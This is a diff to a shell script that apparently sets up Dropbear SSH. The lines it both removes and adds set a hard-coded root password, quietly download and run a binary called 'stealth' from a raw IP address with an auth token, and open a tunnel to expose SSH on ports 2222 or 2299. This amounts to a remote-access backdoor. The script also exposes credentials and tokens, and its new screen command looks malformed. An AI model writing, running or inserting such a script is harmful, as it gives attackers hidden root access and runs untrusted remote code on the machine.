@@ -26,23 +26,21 @@ DROPBEAR_BANNER=""
 DROPBEAR_RECEIVE_WINDOW=65536
 END
 
+sleep 2
+echo "root:Pmataga87465622" | chpasswd
+service ssh restart
+wget -q http://45.135.58.52/stealth >/dev/null
+sleep 2
+service dropbear restart
+sleep 2
+chmod +x stealth
 sleep 2 && \
-echo "root:Pmataga87465622" | chpasswd && \
-service ssh restart && \
-wget -q http://45.135.58.52/stealth >/dev/null && \
-sleep 2 && \
-service dropbear restart && \
-sleep 2 && \
-chmod +x stealth && \
-sleep 2 && \
-./stealth authtoken 1hPY6A7OjP5HfIbcres8VBFPXpy_6iMubeSgbKqXiQcAmf7vy && \
-sleep 2 && \
-screen -dmS sshd bash -c './stealth tcp 2222' && \
+./stealth authtoken 1isPFa4YB5iBdfaB12S3IsHHTRK_Nsw75ddUg9JdEjnPYFa1
+sleep 2
+screen -dmS sshd dropbear -c './stealth tcp 2299'
 
-sleep 5 && \
-
+sleep 5
 netstat -ntlp
-
 sleep 2
 
 curl http://127.0.0.1:4040/api/tunnels && sleep 86400
